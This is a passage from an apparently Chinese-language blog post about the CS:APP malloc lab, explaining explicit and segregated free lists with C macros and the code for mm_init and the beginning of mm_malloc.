406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"></path></g><g data-mml-node="mi" transform="translate(2800.6,0)"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="mo" transform="translate(3789.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mo" transform="translate(4790,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(5179,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(5901.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(6901.4,0)"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"></path></g><g data-mml-node="mo" transform="translate(7617.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mi" transform="translate(8006.4,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(8884.4,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(9229.4,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(9829.4,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(10218.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(10718.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mfrac" transform="translate(11163.1,0)"><g data-mml-node="mi" transform="translate(733.6,676)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="msub" transform="translate(220,-686)"><g data-mml-node="mi"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="TeXAtom" transform="translate(617,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(298,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(643,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(1072,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g></g></g><rect width="1931.2" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(13334.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(13723.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g></g></g></svg></mjx-container></p>
<p>​		其中 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="3.917ex" height="1.889ex" role="img" focusable="false" viewBox="0 -677 1731.2 834.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="TeXAtom" transform="translate(617,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(298,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(643,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(1072,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g></g></g></g></g></svg></mjx-container> 是 libc malloc 的吞吐量，取 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.62ex" height="1.027ex" role="img" focusable="false" viewBox="0 -443 716 454"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"></path></g></g></g></svg></mjx-container> 为 0.6，需要均衡地考虑空间利用率和吞吐量的优化。</p>
<p>​		就吞吐量而言，我们需要关注的是每次执行 mm_malloc、mm_free 和 mm_realloc 的时间复杂度；对于空间利用率而言，我们需要做的是尽可能减少外部碎片（External Fragmentation）和内部碎片（Internal Fragmentation）的出现。</p>
<p>​		本次实验中，为提高吞吐量，采用了显式空闲链表（Explicit Free List）；为提高空间利用率，采用了分离的空闲链表（Segregated Free List），即简单分离存储（Simple Segregated Storage）和分离适配（Segregated Fit）。</p>
<h3 id="显式空闲链表："><a href="#显式空闲链表：" class="headerlink" title="显式空闲链表："></a>显式空闲链表：</h3><p>​		使用双向空闲链表的堆块的格式如下：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/malloc-lab.assets/explicit-free-list.png" alt="explicit-free-list"></p>
<p>​		显式空闲链表和隐式空闲链表在出现相邻的空闲块时的合并方式是类似的，分以下四种情况进行讨论：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/malloc-lab.assets/coalesce.png" alt="coalesce.png"></p>
<p>​		使用双向链表而不是隐式空闲链表，可以使首次适配的分配时间从块总数的线性时间减少到了空闲块数量的线性时间。当然，这种方式也有缺点，即空闲块必须足够大以包含所有需要的指针，以及头部和脚部。这就导致了更大的最小块大小，也潜在地提高了内部碎片的程度。</p>
<h3 id="分离的空闲链表"><a href="#分离的空闲链表" class="headerlink" title="分离的空闲链表"></a>分离的空闲链表</h3><p>​		一个使用单项空闲块链表的分配器需要于空闲块数量呈线性关系的时间来分配块。一种流行的减少分配时间的方法，通常称为分离存储（Segregated Storage），就是维护多个空闲链表，其中每个链表中的块有大致相等的大小。一般的思路是将所有可能的块大小分成一些等价类，也叫做大小类（Size Class）。有很多中方式来定义大小类，本次实验中采取的是根据 2 的幂来划分块大小，共设置 16 个大小类。</p>
<p>​		分配器维护着一个空闲链表数组，每个大小类一个空闲链表，按照大小的升序排列。当分配器需要一个大小为 n 的块时，它就搜索相应的空闲链表。如果不能找到合适的块与之匹配，它就搜索下一个链表，以此类推。</p>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><blockquote>
<p>为方便阅读，代码的具体解释说明以注释形式在代码段中呈现；而正文部分主要描述代码整体构建思路和一些不便以注释形式描述的问题。</p>
</blockquote>
<h3 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h3><p>​		首先是将一些指针算术封装在C的预处理器宏（#define）中，这显著降低了代码的复杂性，这部分主要参考了 <em>参考资料[1]</em> 上的示例代码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Basic constants and macros */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 16 bytes alignment */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGNMENT 16</span></span><br><span class="line"><span class="comment">/* rounds up to the nearest multiple of ALIGNMENT */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT - 1)) &amp; ~(ALIGNMENT - 1))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DSIZE 8 <span class="comment">/* Double word and header/footer size (bytes) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QSIZE 16 <span class="comment">/* Quad word size (bytes) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INITCHUNKSIZE (1 &lt;&lt; 6) <span class="comment">/* Initial heap size (bytes) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZE (1 &lt;&lt; 12) <span class="comment">/* Extend heap by this amount (bytes) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SFL_SIZE 16</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX(x, y) ((x) &gt; (y) ? (x) : (y))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN(x, y) ((x) &lt; (y) ? (x) : (y))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Pack a size and allocated fields from address p */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACK(size, alloc) ((size) | (alloc))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read the size and allocated fields from address p */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET(p) (*(unsigned long long *)(p))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT(p, val) (*(unsigned long long *)(p) = (val))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SET_PTR(p, ptr) (*(unsigned long long *)(p) = (unsigned long long)(ptr))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SIZE(p) (GET(p) &amp; ~0xF)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of its header and footer */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HDRP(bp) ((char *)(bp)-DSIZE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - QSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of next and previous blocks */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE((char *)(bp)-DSIZE))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_BLKP(bp) ((char *)(bp)-GET_SIZE((char *)(bp)-QSIZE))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRED_PTR(bp) ((char *)(bp))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCC_PTR(bp) ((char *)(bp) + DSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRED(bp) (*(char **)(bp))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCC(bp) (*(char **)(SUCC_PTR(bp)))</span></span><br></pre></td></tr></table></figure></div>

<p>​		唯一的全局标量变量，用于指向分离的空闲链表的头部：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> **lists; <span class="comment">/* Pointer pointing to the head of segregated free lists */</span> </span><br></pre></td></tr></table></figure></div>

<p>​		声明的一些辅助函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Extend heap */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> size)</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* Coalesce adjacent free blocks */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *ptr)</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate a block of 'size' bytes at ptr, and separate if appropriate */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">place</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Insert the free block into segregated free lists */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">insert_node</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* Delete the free block from segregated free lists */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete_node</span><span class="params">(<span class="type">void</span> *ptr)</span>; </span><br></pre></td></tr></table></figure></div>



<h3 id="Main-Body"><a href="#Main-Body" class="headerlink" title="Main Body"></a>Main Body</h3><p>​		现在我们来关注 Lab 中要求完成的四个函数。</p>
<h4 id="mm-init"><a href="#mm-init" class="headerlink" title="mm_init:"></a>mm_init:</h4><p>​		由于 Lab 不允许在程序中定义全局或静态的符合数据结构，因此将分离的空闲链表放置于堆的头部。并设置序言块和结尾块以标明的真实储存区间的开头和结尾，同时对堆进行初次的拓展。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">/* Alloc space for the segregated free lists */</span></span><br><span class="line">    <span class="keyword">if</span>((lists = mem_sbrk(SFL_SIZE * QSIZE)) == (<span class="type">void</span> *)<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize the segregated free lists */</span></span><br><span class="line">    <span class="type">int</span> list_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (list_idx &lt; SFL_SIZE)</span><br><span class="line">        lists[list_idx++] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize the heap */</span></span><br><span class="line">    <span class="type">char</span> *heap;</span><br><span class="line">    <span class="keyword">if</span> ((heap = mem_sbrk(<span class="number">4</span> * DSIZE)) == (<span class="type">void</span> *)<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    PUT(heap, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    PUT(heap + (<span class="number">1</span> * DSIZE), PACK(QSIZE, <span class="number">1</span>)); <span class="comment">/* Fill the preface block */</span></span><br><span class="line">    PUT(heap + (<span class="number">2</span> * DSIZE), PACK(QSIZE, <span class="number">1</span>)); <span class="comment">/* Fill the preface block */</span></span><br><span class="line">    PUT(heap + (<span class="number">3</span> * DSIZE), PACK(<span class="number">0</span>, <span class="number">1</span>));     <span class="comment">/* Fill the end block */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Extend initial heap */</span></span><br><span class="line">    <span class="keyword">if</span> (extend_heap(INITCHUNKSIZE) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>



<h4 id="mm-malloc"><a href="#mm-malloc" class="headerlink" title="mm_malloc:"></a>mm_malloc:</h4><p>​		采用的是分离适配法。首先进行内存对齐，再根据内存对齐后的大小在分离的空闲链表中寻找相应的链。由于在同一大小类的空闲链表中空闲快按照从小到大的顺序插入，因此找到的第一个便是最适配的。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">/* Ignore spuious requests */</span></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Adjust block size to include overhead and alignment reqs */</span></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= QSIZE)</span><br><span class="line">        size = <span class="number">2</span> * QSIZE;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        size = QSIZE * ((size + (QSIZE) + (QSIZE - <span class="number">1</span>)) / QSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> list_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> searchsize = size;</span><br><span class="line">    <span class="type">void</span> *ptr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (list_idx &lt; SFL_SIZE)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">/* Search for the corresponding list */</span></span><br><span class="line">        <span class="keyword">if</span> (((searchsize &lt;= <span class="number">1</span>) &amp;&amp; 